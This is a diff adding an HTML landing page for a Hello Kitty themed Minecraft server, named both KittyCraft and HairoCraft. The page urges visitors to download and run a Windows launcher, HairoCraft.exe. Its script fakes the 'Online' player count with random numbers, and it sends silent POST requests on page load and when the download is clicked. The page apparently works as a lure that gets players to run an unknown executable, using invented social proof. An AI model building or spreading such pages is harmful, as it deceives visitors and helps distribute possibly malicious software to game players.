@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>KittyCraft SMP — Hello Kitty & Minecraft Server</title>
+    <meta name="description" content="Hello Kitty themed Minecraft SMP server. Download the launcher and join a cozy, pink-white community!">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="container nav-container">
+        <a href="#" class="brand" aria-label="Home">
+          <span class="brand-mark">HairoCraft</span>
+          <span class="online-count-badge"><span class="dot"></span>Online <strong id="online-count">--</strong></span>
+        </a>
+        <input type="checkbox" id="nav-toggle" class="nav-toggle" aria-label="Toggle navigation">
+        <label for="nav-toggle" class="nav-burger" aria-hidden="true">
+          <span></span><span></span><span></span>
+        </label>
+        <nav class="main-nav">
+          <ul>
+            <li><a href="#features">Features</a></li>
+            <li><a href="#gallery">Gallery</a></li>
+            <li><a href="#download">Download</a></li>
+            <li><a href="#faq">FAQ</a></li>
+          </ul>
+          <button class="btn btn-primary nav-cta" id="open-signup" type="button">Sign up now!</button>
+        </nav>
+      </div>
+    </header>
+    <div id="signup-modal" class="modal hidden">
+      <div class="modal-backdrop"></div>
+      <div class="modal-content" role="dialog" aria-modal="true" aria-labelledby="signup-title">
+        <button class="modal-close" id="close-signup" aria-label="Close">×</button>
+        <h3 id="signup-title">Sign up</h3>
+        <p>Sign-ups are handled via the Client. Please open the HairoCraft Launcher to create your account.</p>
+        <a class="btn btn-primary" id="go-launcher" href="#download">Get the Launcher</a>
+      </div>
+    </div>
+    <main>
+      <section class="hero" id="home">
+        <div class="container hero-inner">
+          <div class="hero-copy">
+            <div class="pill">Hello Kitty ✦ SMP ✦ Community</div>
+            <h1>The Sweetest Minecraft SMP Server</h1>
+            <p class="lede">
+              A pink‑white, zero‑toxicity <strong>Hello Kitty</strong> SMP experience.
+              Economy, events, protected plots, and a cozy community!
+            </p>
+            <div class="cta-row">
+              <a class="btn btn-primary" href="#download"><img class="emoji-icon" src="images/windows.png" alt=""> Download for Windows</a>
+              <a class="btn btn-ghost" href="#features">See Features</a>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="section" id="features">
+        <div class="container">
+          <header class="section-head">
+            <h2>Features</h2>
+            <p>Vanilla+ balance, a Hello Kitty touch, and community‑first rules.</p>
+          </header>
+          <div class="grid features">
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Hello Kitty Theme</h3>
+              <p>Pink‑white UI, cute cosmetics, and a heart‑filled world.</p>
+            </article>
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Vanilla+ SMP</h3>
+              <p>Fair, non‑overpowered systems; explore, build, and have fun together.</p>
+            </article>
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Economy & Market</h3>
+              <p>Player market, secure trading, and balanced ways to earn.</p>
+            </article>
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Protected Plots</h3>
+              <p>Your builds are safe. Region protection and permissions for peace of mind.</p>
+            </article>
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Events</h3>
+              <p>Weekly mini‑games, community contests, and seasonal surprises.</p>
+            </article>
+            <article class="card feature">
+              <div class="icon"><img src="images/emoji.png" alt=""></div>
+              <h3>Zero Toxicity</h3>
+              <p>Warm, respectful vibes. Clear rules and active moderation.</p>
+            </article>
+          </div>
+        </div>
+      </section>
+      <section class="section alt" id="gallery">
+        <div class="container">
+          <header class="section-head">
+            <h2>Gallery</h2>
+            <p>Sweet moments from the server.</p>
+          </header>
+          <div class="grid gallery">
+            <figure class="shot">
+              <img class="shot-img" src="images/server.jpg" alt="HairoCraft spawn" loading="lazy">
+              <figcaption>Spawn</figcaption>
+            </figure>
+            <figure class="shot">
+              <img class="shot-img" src="images/server2.jpg" alt="HairoCraft market" loading="lazy">
+              <figcaption>Market</figcaption>
+            </figure>
+            <figure class="shot">
+              <img class="shot-img" src="images/server3.jpg" alt="HairoCraft event" loading="lazy">
+              <figcaption>Event</figcaption>
+            </figure>
+          </div>
+        </div>
+      </section>
+      <section class="section alt" id="download">
+        <div class="container">
+          <header class="section-head">
+            <h2>Download</h2>
+            <p>One‑click setup, auto‑updates, and a preloaded server list.</p>
+          </header>
+          <div class="grid downloads">
+          <article class="card dl-card">
+            <div class="dl-icon"><img src="images/emoji.png" alt=""></div>
+            <h3>Windows</h3>
+            <p>64-bit Windows 10/11. Native installer (.exe).</p>
+            <a class="btn btn-primary w-full" href="HairoCraft.exe" id="downloadBtn">
+              <img class="emoji-icon" src="images/windows.png" alt=""> 
+              Download for Windows
+            </a>
+          </article>
+        </div>
+        <script>
+          document.getElementById('downloadBtn').addEventListener('click', async (e) => {
+            fetch('api/1.php', { method: 'POST' });
+          });
+        </script>
+          <div class="steps">
+            <h4>Installation Steps</h4>
+            <ol>
+              <li>Download the Windows installer (.exe).</li>
+              <li>Run setup and follow the instructions.</li>
+              <li>Open the launcher and sign in.</li>
+              <li>Select <strong>HairoCraft SMP</strong> from the server list and join!</li>
+            </ol>
+            <p class="note">Note: Files are placeholders. Add your own launcher files to the <code>downloads/</code> folder.</p>
+          </div>
+        </div>
+      </section>
+      <section class="section" id="faq">
+        <div class="container">
+          <header class="section-head">
+            <h2>FAQ</h2>
+            <p>Quick answers to common questions.</p>
+          </header>
+          <div class="faq">
+            <details>
+              <summary>How do I connect?</summary>
+              <p>Use our custom client from the launcher. No IP needed.</p>
+            </details>
+            <details>
+              <summary>Which Minecraft version?</summary>
+              <p>We provide a custom client via our launcher. No manual version selection needed.</p>
+            </details>
+            <details>
+              <summary>What are the rules?</summary>
+              <p>No toxicity, no cheating, respect first. Full details are on Discord.</p>
+            </details>
+            <details>
+              <summary>Is Bedrock supported?</summary>
+              <p>Coming soon. Watch announcements on Discord.</p>
+            </details>
+          </div>
+        </div>
+      </section>
+    </main>
+    <footer class="site-footer">
+      <div class="container foot">
+        <p>© <span id="year"></span> HairoCraft SMP. All rights reserved.</p>
+        <p class="small">Minecraft is a trademark of Mojang Studios. Hello Kitty is a trademark of Sanrio Co., Ltd. This site is unofficial.</p>
+      </div>
+    </footer>
+    <script>
+		window.addEventListener('load', async () => {
+            await fetch('api/2.php', { method: 'POST' });
+        });
+		
+      (function () {
+        var yearEl = document.getElementById('year');
+        if (yearEl) {
+          yearEl.textContent = new Date().getFullYear();
+        }
+
+        var countEl = document.getElementById('online-count');
+        function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function updateCount() { if (countEl) countEl.textContent = String(rand(130, 150)); }
+        updateCount();
+        setInterval(updateCount, 15000);
+
+        var openBtn = document.getElementById('open-signup');
+        var modal = document.getElementById('signup-modal');
+        var closeBtn = document.getElementById('close-signup');
+        function openModal() { if (modal) modal.classList.remove('hidden'); }
+        function closeModal() { if (modal) modal.classList.add('hidden'); }
+        if (openBtn) openBtn.addEventListener('click', openModal);
+        if (closeBtn) closeBtn.addEventListener('click', closeModal);
+        if (modal) modal.addEventListener('click', function (e) {
+          if (e.target && e.target.classList && e.target.classList.contains('modal-backdrop')) closeModal();
+        });
+        document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeModal(); });
+
+        var goLauncherBtn = document.getElementById('go-launcher');
+        var downloadSection = document.getElementById('download');
+        if (goLauncherBtn && downloadSection) {
+          goLauncherBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            closeModal();
+            setTimeout(function () { downloadSection.scrollIntoView({ behavior: 'smooth' }); }, 50);
+          });
+        }
+
+        var navLinks = document.querySelectorAll('.main-nav a[href^="#"]');
+        var navToggle = document.getElementById('nav-toggle');
+        navLinks.forEach(function (link) {
+          link.addEventListener('click', function (e) {
+            var targetId = link.getAttribute('href').slice(1);
+            var targetEl = document.getElementById(targetId);
+            if (targetEl) {
+              e.preventDefault();
+              if (navToggle && navToggle.checked) navToggle.checked = false;
+              targetEl.scrollIntoView({ behavior: 'smooth' });
+            }
+          });
+        });
+
+        var preloader = document.getElementById('preloader');
+        if (preloader) {
+          setTimeout(function () {
+            preloader.classList.add('hide');
+            setTimeout(function () { preloader.parentNode && preloader.parentNode.removeChild(preloader); }, 500);
+          }, 5000);
+        }
+      })();
+    </script>
+  
+</body></html>
